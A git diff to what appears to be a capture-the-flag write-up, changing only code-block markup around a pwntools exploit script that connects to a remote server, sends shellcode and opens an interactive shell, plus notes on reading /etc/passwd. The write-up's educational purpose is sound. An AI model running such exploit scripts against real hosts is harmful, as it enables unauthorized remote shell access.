@@ -99,7 +99,7 @@ I grabbed the shellcode from [shellstorm](http://shell-storm.org/shellcode/) (ch
 
 So we construct the payload:
 
-{% highlight python %}
+```python
 import struct
 from pwn import *
 r = remote("52.7.95.224", 8030)
@@ -120,7 +120,7 @@ print r.recvuntil(":")
 print repr(payload),len(payload)
 r.sendline(payload)
 r.interactive()
-{% endhighlight %}
+```
 
 But there was a _little_ twist when I ran it on the server:
 ```console
@@ -153,7 +153,7 @@ feed:x:1000:1000:,,,:/home/feed:/bin/bash
 
 Then it struck me: Let's try `/bin/bash` instead of `sh`, which then worked (the same thing which `/etc/passwd` just told us). Here's the updated payload and output:
 
-{% highlight python %}
+```python
 import struct
 from pwn import *
 r = remote("52.7.95.224", 8030)
@@ -175,7 +175,7 @@ print r.recvuntil(":")
 print repr(payload),len(payload)
 r.sendline(payload)
 r.interactive()
-{% endhighlight %}
+```
 
 ```console
 $ python exploit.py 
